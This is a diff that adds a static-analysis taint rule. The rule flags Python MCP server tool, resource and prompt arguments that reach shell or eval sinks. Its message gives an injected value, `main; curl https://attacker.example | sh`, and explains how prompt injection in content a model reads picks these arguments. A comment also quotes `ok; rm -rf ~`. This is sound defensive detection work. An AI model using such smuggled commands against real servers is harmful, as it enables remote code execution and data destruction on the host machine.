@@ -1,0 +1,427 @@
+rules:
+  - id: mcp-tool-arg-to-shell
+    # Sources: MCP Python SDK v2.3.0 (MCPServer, low-level Server(on_call_tool=...)), v1.30.0
+    # (FastMCP, low-level @server.call_tool()), fastmcp 4.1.3 / 3.4.11 (@mcp.tool, @tool,
+    # mcp.add_tool), and Claude Agent SDK 0.2.172 @tool (an in-process MCP tool). The
+    # pattern-sources block is shared with mcp-tool-arg-option-injection and
+    # mcp-tool-arg-to-sql (build.py SHARED_BLOCKS): edit them together.
+    # Resource templates and prompts (since 2026-10-25): MCPServer / FastMCP
+    # @mcp.resource("x://{name}") and @mcp.prompt(), fastmcp 4.1.3 resource / prompt (also the
+    # standalone decorators) and add_prompt / add_template, v1.30.0 @server.read_resource() and
+    # @server.get_prompt(), and v2.3.0 Server(on_read_resource=..., on_get_prompt=...). The SDKs
+    # validate template and prompt arguments against the annotations as they do tool arguments;
+    # v2's default ResourceSecurity rejects "..", absolute paths, and NUL in template values,
+    # which stops none of these sinks.
+    languages: [python]
+    severity: ERROR
+    message: >-
+      An MCP tool argument, resource-template parameter, or prompt argument reaches a shell or
+      code-execution sink. The client fills every one of them, and clients let the model
+      choose them (tool arguments always, resource URIs and prompt arguments in many clients);
+      the server can't tell who did. A prompt injection in anything the model has read (a web
+      page, an issue, a file, another tool's result) can choose them for it, so a value like
+      `main; curl https://attacker.example | sh` runs as a command on the machine hosting this
+      server. Pass an argument list without a shell (`subprocess.run(["git", "log", "--",
+      ref])`), constrain the parameter's type (`Literal[...]`, `int`), or quote it with
+      `shlex.quote()` when a shell is unavoidable; never evaluate it as code.
+    mode: taint
+    pattern-sources:
+      # A tool function's parameters, and since 2026-10-25 a resource template's URI parameters
+      # and a prompt's arguments: the client fills all three, and clients let the model fill
+      # them. Parameters typed int, float, bool, Literal[...] (or an alias of one assigned
+      # earlier in the file), a Context, or a string constrained by an anchored pattern
+      # (Field(pattern=r"^...$")) are skipped: the SDKs
+      # validate tool, template, and prompt arguments against the annotation with pydantic
+      # before the call, so they can't carry injected text.
+      - patterns:
+          - pattern-either:
+              # MCPServer (v2), FastMCP (v1), fastmcp, and any @<server>.tool registration,
+              # bare or called; @<server>.resource("x://{name}") templates (a resource
+              # function's parameters are its URI template's variables: a static URI takes
+              # none) and @<server>.prompt prompts; the v1 low-level Server's
+              # @server.call_tool() handler(name, arguments), @server.read_resource()
+              # handler(uri), and @server.get_prompt() handler(name, arguments); fastmcp's
+              # standalone decorators (from fastmcp.tools import tool, fastmcp.resources
+              # resource, fastmcp.prompts prompt); the Claude Agent SDK's in-process MCP tool,
+              # @tool(name, description, schema).
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          @$DEC(...)
+                          def $F(...): ...
+                      - pattern-inside: |
+                          @$DEC
+                          def $F(...): ...
+                  - metavariable-pattern:
+                      metavariable: $DEC
+                      patterns:
+                        - pattern-either:
+                            - pattern: $S.tool
+                            - pattern: $S.call_tool
+                            - pattern: $S.resource
+                            - pattern: $S.prompt
+                            - pattern: $S.read_resource
+                            - pattern: $S.get_prompt
+                            - pattern: fastmcp.tools.tool
+                            - pattern: fastmcp.resources.resource
+                            - pattern: fastmcp.prompts.prompt
+                            - pattern: claude_agent_sdk.tool
+                        # LangChain's and CrewAI's @tool resolve to <module>.tool too: agent
+                        # tools, covered by agent-tool-arg-to-shell.
+                        - pattern-not: langchain_core.tools.tool
+                        - pattern-not: langchain.tools.tool
+                        - pattern-not: langchain.agents.tool
+                        - pattern-not: crewai.tools.tool
+                        # Dagster's @resource builds a pipeline resource from run config.
+                        - pattern-not: dagster.resource
+              # A plain function registered by name later in the file: mcp.add_tool(fn),
+              # mcp.add_prompt(fn), or the same with Tool / Prompt / ResourceTemplate
+              # .from_function(fn, ...) (add_tool, add_prompt, add_template). The regex covers
+              # the def (decorators, signature, and indented body) and looks ahead for the
+              # registration; its F group must name the def below. A statement region from
+              # each def to a later registration took 50 s per region on a 4,000-function
+              # file (OpenGrep 1.30.2); the regex scans the rest of the file once per def.
+              - pattern-regex: >-
+                  (?m)^(?<IND>[ \t]*+)(?:@[^\n]*+\n\k<IND>)*+(?:async[ \t]++)?def[ \t]++(?<F>\w++)\b[^\n]*+(?:\n(?:\k<IND>[ \t)\]][^\n]*+|[ \t]*+(?:\#[^\n]*+)?(?=\n|\z)))*+(?=(?:[^.]++|\.(?!add_(?:tool|prompt|template)\(\s*+(?:[\w.]+\.from_function\(\s*+)?\k<F>\b))*+\.add_)
+          # pydantic-ai's @agent.tool takes a RunContext first: an agent tool, covered by
+          # agent-tool-arg-to-shell.
+          - pattern-not-inside: |
+              def $F($CTX: pydantic_ai.RunContext, ...): ...
+          - pattern-not-inside: |
+              def $F($CTX: pydantic_ai.RunContext[...], ...): ...
+          - pattern-either:
+              - patterns:
+                  - pattern: |
+                      def $F(..., $P, ...): ...
+                  - pattern-not: |
+                      def $F(..., $P: $TYPE, ...): ...
+                  - pattern-not: |
+                      def $F(..., $P: $TYPE = $DEFAULT, ...): ...
+              - patterns:
+                  - pattern-either:
+                      - pattern: |
+                          def $F(..., $P: $TYPE, ...): ...
+                      - pattern: |
+                          def $F(..., $P: $TYPE = $DEFAULT, ...): ...
+                  - metavariable-regex:
+                      metavariable: $TYPE
+                      regex: ^(?!(?:typing\.)?(?:Annotated\[\s*)?(?:int|float|bool|(?:typing\.)?Literal\[|[\w.]*Context\b)|.*\bpattern\s*=\s*r?["']\^.*\$["'])
+                  # A Literal alias assigned earlier in the block (Service = Literal["web", "db"],
+                  # or Service: TypeAlias = ...) is as safe as the Literal written inline.
+                  - pattern-not-inside: |
+                      $TYPE = typing.Literal[...]
+                      ...
+                  - pattern-not-inside: |
+                      $TYPE: $ALIAS_KIND = typing.Literal[...]
+                      ...
+                  - pattern-not-inside: |
+                      $TYPE = typing_extensions.Literal[...]
+                      ...
+                  - pattern-not-inside: |
+                      $TYPE: $ALIAS_KIND = typing_extensions.Literal[...]
+                      ...
+          - focus-metavariable: $P
+      # v2 low-level Server: on_call_tool(ctx, params), on_read_resource(ctx, params), and
+      # on_get_prompt(ctx, params), where params.arguments is the client's argument dict and
+      # params.uri the URI it asked for. Recognized by the params annotation or by the
+      # Server(...) keyword that registers the handler later in the file (a regex over the
+      # def, as above, tried only on defs with exactly two parameters and no defaults).
+      - patterns:
+          - pattern-either:
+              - pattern: |
+                  def $H(..., $P: mcp.types.CallToolRequestParams, ...): ...
+              - pattern: |
+                  def $H(..., $P: CallToolRequestParams, ...): ...
+              - pattern: |
+                  def $H(..., $P: mcp.types.ReadResourceRequestParams, ...): ...
+              - pattern: |
+                  def $H(..., $P: ReadResourceRequestParams, ...): ...
+              - pattern: |
+                  def $H(..., $P: mcp.types.GetPromptRequestParams, ...): ...
+              - pattern: |
+                  def $H(..., $P: GetPromptRequestParams, ...): ...
+              - patterns:
+                  - pattern-regex: >-
+                      (?m)^(?<IND>[ \t]*+)(?:@[^\n]*+\n\k<IND>)*+(?:async[ \t]++)?def[ \t]++(?<H>\w++)[ \t]*+\([^,()=]*+,[^,()=]*+(?:,\s*+)?\)[^\n]*+(?:\n(?:\k<IND>[ \t)\]][^\n]*+|[ \t]*+(?:\#[^\n]*+)?(?=\n|\z)))*+(?=(?:[^o]++|o(?!n_(?:call_tool|read_resource|get_prompt)\s*+=\s*+\k<H>\b))*+on_)
+                  - pattern: |
+                      def $H($CTX, $P): ...
+          - focus-metavariable: $P
+    pattern-sanitizers:
+      # An allowlist check before use: re.fullmatch, or re.match / re.search with a pattern
+      # anchored at the end. (A start-only re.match lets "ok; rm -rf ~" through.)
+      - by-side-effect: true
+        patterns:
+          - pattern-either:
+              - pattern: re.fullmatch($PAT, $X, ...)
+              - pattern: $RE.fullmatch($X, ...)
+              - patterns:
+                  - pattern-either:
+                      - pattern: re.match($PAT, $X, ...)
+                      - pattern: re.search($PAT, $X, ...)
+                  - metavariable-regex:
+                      metavariable: $PAT
+                      regex: ^[rRbB]*["'].*(?:\$|\\Z)["']$
+          - focus-metavariable: $X
+      # An allowlist membership check before use: `if unit not in ALLOWED_UNITS: raise`.
+      # (Only the left operand: `";" in value` is a blocklist check and sanitizes nothing.)
+      - by-side-effect: true
+        patterns:
+          - pattern-either:
+              - pattern: $X in $ALLOWED
+              - pattern: $X not in $ALLOWED
+          - focus-metavariable: $X
+      - exact: true
+        pattern: shlex.quote(...)
+      - exact: true
+        pattern: shlex.join(...)
+      - exact: true
+        pattern: pipes.quote(...)
+      - exact: true
+        pattern: int(...)
+      - exact: true
+        pattern: float(...)
+    pattern-sinks:
+      # The code argument only: an argument passed in the globals or locals dict is data.
+      - patterns:
+          - pattern-either:
+              - pattern-inside: eval($CODE, ...)
+              - pattern-inside: exec($CODE, ...)
+              - pattern-inside: compile($CODE, ...)
+          - pattern: $CODE
+      # The command, passed first or by its keyword name (CPython 3.15.2: os.system command=,
+      # os.popen, getoutput, getstatusoutput, and asyncio cmd=; paramiko 4.0.0 command=).
+      - patterns:
+          - pattern-either:
+              - pattern-inside: os.system($CMD, ...)
+              - pattern-inside: os.system(..., command=$CMD, ...)
+              - pattern-inside: os.popen($CMD, ...)
+              - pattern-inside: os.popen(..., cmd=$CMD, ...)
+              - pattern-inside: subprocess.getoutput($CMD, ...)
+              - pattern-inside: subprocess.getoutput(..., cmd=$CMD, ...)
+              - pattern-inside: subprocess.getstatusoutput($CMD, ...)
+              - pattern-inside: subprocess.getstatusoutput(..., cmd=$CMD, ...)
+              - pattern-inside: asyncio.create_subprocess_shell($CMD, ...)
+              - pattern-inside: asyncio.create_subprocess_shell(..., cmd=$CMD, ...)
+              - pattern-inside: asyncio.subprocess.create_subprocess_shell($CMD, ...)
+              - pattern-inside: asyncio.subprocess.create_subprocess_shell(..., cmd=$CMD, ...)
+              - pattern-inside: $LOOP.subprocess_shell($FACTORY, $CMD, ...)
+              - pattern-inside: $LOOP.subprocess_shell(..., cmd=$CMD, ...)
+              # paramiko: the SSH server runs the string in the remote user's shell.
+              - pattern-inside: $SSH.exec_command($CMD, ...)
+              - pattern-inside: $SSH.exec_command(..., command=$CMD, ...)
+          - pattern: $CMD
+      # shell=True: only the command, passed first or as args= (run, call, check_call, and
+      # check_output hand their arguments to Popen(args, ...)). With shell=True, later list
+      # items become the shell's $0, $1, ... and are not parsed as commands.
+      - patterns:
+          - pattern-either:
+              - pattern-inside: subprocess.$FN($CMD, ..., shell=True, ...)
+              - pattern-inside: subprocess.$FN(..., args=$CMD, ..., shell=True, ...)
+          - metavariable-regex:
+              metavariable: $FN
+              regex: ^(run|call|check_call|check_output|Popen)$
+          - pattern: $CMD
+          - pattern-not: '[...]'
+      # anyio runs a str command through the shell and a sequence without one, so only
+      # string-building expressions count, directly or through a name assigned one.
+      - patterns:
+          - pattern-either:
+              - pattern-inside: anyio.run_process($CMD, ...)
+              - pattern-inside: anyio.run_process(..., command=$CMD, ...)
+              - pattern-inside: anyio.open_process($CMD, ...)
+              - pattern-inside: anyio.open_process(..., command=$CMD, ...)
+          - pattern: $CMD
+          - pattern-either:
+              - patterns:
+                  - pattern-inside: |
+                      $CMD = $STR
+                      ...
+                  - metavariable-pattern:
+                      metavariable: $STR
+                      pattern-either:
+                        - pattern: f"..."
+                        - pattern: $A + $B
+                        - pattern: $A % $B
+                        - pattern: $FMT.format(...)
+                        - pattern: $SEP.join(...)
+              - pattern-either:
+                  - pattern: f"..."
+                  - pattern: $A + $B
+                  - pattern: $A % $B
+                  - pattern: $FMT.format(...)
+                  - pattern: $SEP.join(...)
+          - pattern-not: '[...] + $B'
+          - pattern-not: '$A + [...]'
+      # An argv that starts a shell on the next item: ["bash", "-c", cmd], ("sh", "-lc", cmd),
+      # ["cmd.exe", "/c", cmd], or the same items passed positionally
+      # (asyncio.create_subprocess_exec("sh", "-c", cmd), os.execlp("sh", "sh", "-c", cmd)).
+      - patterns:
+          - pattern-either:
+              - pattern: '[..., $SH, $FLAG, $CMD, ...]'
+              - pattern: '(..., $SH, $FLAG, $CMD, ...)'
+              - pattern: $EXEC(..., $SH, $FLAG, $CMD, ...)
+          - metavariable-regex:
+              metavariable: $SH
+              regex: ^["'](?:[\w./-]*/)?(?:(?:ba|da|z|k|fi|c|tc)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?|pwsh)["']$
+          - metavariable-regex:
+              metavariable: $FLAG
+              regex: ^["'](?:-[a-zA-Z]*c[a-zA-Z]*|/[cCkK]|-(?i:command))["']$
+          - focus-metavariable: $CMD
+      # The last two sinks are also shared with llm-output-to-code-execution (build.py
+      # SHARED_BLOCKS).
+      # An argv that starts an interpreter on inline code: [sys.executable, "-c", code],
+      # ["node", "-e", code], ("deno", "eval", code), or the same items passed positionally.
+      # Each interpreter is paired with its own eval flag, so `node -c` (syntax check) doesn't
+      # count.
+      # The eval flag comes right after the interpreter or after one option that takes no
+      # value ([sys.executable, "-I", "-c", code]).
+      - patterns:
+          - pattern-either:
+              - pattern: '[..., $BIN, $FLAG, $CODE, ...]'
+              - pattern: '(..., $BIN, $FLAG, $CODE, ...)'
+              - pattern: $EXEC(..., $BIN, $FLAG, $CODE, ...)
+              - patterns:
+                  - pattern-either:
+                      - pattern: '[..., $BIN, $OPT, $FLAG, $CODE, ...]'
+                      - pattern: '(..., $BIN, $OPT, $FLAG, $CODE, ...)'
+                      - pattern: $EXEC(..., $BIN, $OPT, $FLAG, $CODE, ...)
+                  - metavariable-regex:
+                      metavariable: $OPT
+                      regex: ^["'](?:-(?![WXmr]["'])[a-zA-Z]{1,3}|--[a-z][\w-]*(?<!require)(?<!import)(?<!loader))["']$
+          - metavariable-comparison:
+              comparison: >-
+                ((re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:python[0-9.]*|py)(?:[.]exe)?$", str($BIN))
+                or str($BIN) == "sys.executable")
+                and str($FLAG) == "-c")
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:node|nodejs|bun|tsx|ts-node)(?:[.]exe)?$", str($BIN))
+                and re.match("^(?:-e|--eval|-p|--print|-pe)$", str($FLAG)))
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?deno(?:[.]exe)?$", str($BIN)) and str($FLAG) == "eval")
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:ruby|perl)(?:[.]exe)?$", str($BIN)) and re.match("^-[eE]$", str($FLAG)))
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?php(?:[.]exe)?$", str($BIN)) and str($FLAG) == "-r")
+          - focus-metavariable: $CODE
+      # Code written to a file and then run in the same function: path.write_text(code) or
+      # `with open(path, "w") as f: f.write(code)` (or a NamedTemporaryFile), and later
+      # subprocess.run([sys.executable, str(path)]), create_subprocess_exec("bash", path),
+      # runpy.run_path(path), or spec_from_file_location(name, path). Only the written contents
+      # count; a file handed to a program that only reads it (git, a linter) doesn't. The argv
+      # list may also be passed by keyword (subprocess args=, anyio command=).
+      - patterns:
+          - pattern-either:
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          $PATH.write_text($CODE, ...)
+                          ...
+                          $RUN([$BIN, ..., <... $PATH ...>, ...], ...)
+                      - pattern-inside: |
+                          $PATH.write_text($CODE, ...)
+                          ...
+                          $RUN(..., $KW=[$BIN, ..., <... $PATH ...>, ...], ...)
+                      - pattern-inside: |
+                          $PATH.write_text($CODE, ...)
+                          ...
+                          $RUN($BIN, ..., <... $PATH ...>, ...)
+                      - pattern-inside: |
+                          with open($PATH, ...) as $F:
+                              ...
+                          ...
+                          $RUN([$BIN, ..., <... $PATH ...>, ...], ...)
+                      - pattern-inside: |
+                          with open($PATH, ...) as $F:
+                              ...
+                          ...
+                          $RUN(..., $KW=[$BIN, ..., <... $PATH ...>, ...], ...)
+                      - pattern-inside: |
+                          with open($PATH, ...) as $F:
+                              ...
+                          ...
+                          $RUN($BIN, ..., <... $PATH ...>, ...)
+                      - patterns:
+                          - pattern-either:
+                              - pattern-inside: |
+                                  with $TMP(...) as $F:
+                                      ...
+                                  ...
+                                  $RUN([$BIN, ..., <... $F.name ...>, ...], ...)
+                              - pattern-inside: |
+                                  with $TMP(...) as $F:
+                                      ...
+                                  ...
+                                  $RUN(..., $KW=[$BIN, ..., <... $F.name ...>, ...], ...)
+                              - pattern-inside: |
+                                  with $TMP(...) as $F:
+                                      ...
+                                  ...
+                                  $RUN($BIN, ..., <... $F.name ...>, ...)
+                          - metavariable-regex:
+                              metavariable: $TMP
+                              regex: ^(?:tempfile\.)?NamedTemporaryFile$
+                  - metavariable-regex:
+                      metavariable: $BIN
+                      regex: ^(?:["'](?:[\w./-]*/)?(?:python[\d.]*|py|node|nodejs|deno|bun|ruby|perl|php|(?:ba|da|z|k|fi|c|tc)?sh|pwsh|powershell)(?:\.exe)?["']|sys\.executable)$
+                  - metavariable-regex:
+                      metavariable: $RUN
+                      regex: ^(?:subprocess\.(?:run|call|check_call|check_output|Popen)|(?:asyncio\.)?create_subprocess_exec|anyio\.(?:run_process|open_process)|os\.(?:exec|spawn)\w*)$
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          $PATH.write_text($CODE, ...)
+                          ...
+                          $LOAD(..., <... $PATH ...>, ...)
+                      - pattern-inside: |
+                          with open($PATH, ...) as $F:
+                              ...
+                          ...
+                          $LOAD(..., <... $PATH ...>, ...)
+                      - patterns:
+                          - pattern-inside: |
+                              with $TMP(...) as $F:
+                                  ...
+                              ...
+                              $LOAD(..., <... $F.name ...>, ...)
+                          - metavariable-regex:
+                              metavariable: $TMP
+                              regex: ^(?:tempfile\.)?NamedTemporaryFile$
+                  - metavariable-regex:
+                      metavariable: $LOAD
+                      regex: ^(?:runpy\.run_path|(?:importlib\.util\.)?spec_from_file_location)$
+          # The written contents themselves, not a later use of the same name.
+          - pattern-either:
+              - pattern-inside: $PATH.write_text($CODE, ...)
+              - pattern-inside: $F.write($CODE)
+          - pattern: $CODE
+    metadata:
+      category: security
+      subcategory: [vuln]
+      pack-category: mcp-server
+      owasp-llm:
+        - "LLM10:2026 - Improper Output Handling"
+        - "LLM05:2025 - Improper Output Handling"
+      owasp-agentic:
+        - "ASI05 - Unexpected Code Execution (RCE)"
+        - "ASI02 - Tool Misuse and Exploitation"
+      owasp-mcp:
+        - "MCP05:2025 - Command Injection & Execution"
+      owasp-aisvs:
+        - "v1.01-C10.4.4 - Schema, Message, and Input Validation"
+      mitre-atlas:
+        - "AML.T0053 - AI Agent Tool Invocation"
+        - "AML.T0050 - Command and Scripting Interpreter"
+      cwe:
+        - "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+        - "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+      confidence: HIGH
+      likelihood: MEDIUM
+      impact: HIGH
+      technology: [mcp, fastmcp, claude-agent-sdk]
+      references:
+        - https://github.com/modelcontextprotocol/python-sdk/blob/v2.3.0/src/mcp/server/mcpserver/resources/templates.py
+        - https://github.com/modelcontextprotocol/python-sdk/blob/v2.3.0/src/mcp/server/mcpserver/prompts/base.py
+        - https://github.com/PrefectHQ/fastmcp/blob/v4.1.3/fastmcp_slim/fastmcp/resources/function_resource.py
+        - https://github.com/modelcontextprotocol/python-sdk/blob/v2.3.0/src/mcp/server/mcpserver/server.py
+        - https://github.com/modelcontextprotocol/python-sdk/blob/v2.3.0/src/mcp/server/lowlevel/server.py
+        - https://github.com/modelcontextprotocol/python-sdk/blob/v1.30.0/src/mcp/server/lowlevel/server.py
+        - https://github.com/PrefectHQ/fastmcp/blob/v4.1.3/fastmcp_slim/fastmcp/server/server.py
+        - https://github.com/agronholm/anyio/blob/4.15.1/src/anyio/_core/_subprocesses.py
+        - https://github.com/OWASP/www-project-mcp-top-10/blob/165fe0f78ef104459237b4a8e0f6e78db9b02391/2025/MCP05-2025%E2%80%93Command-Injection%26Execution.md
+        - https://cwe.mitre.org/data/definitions/78.html
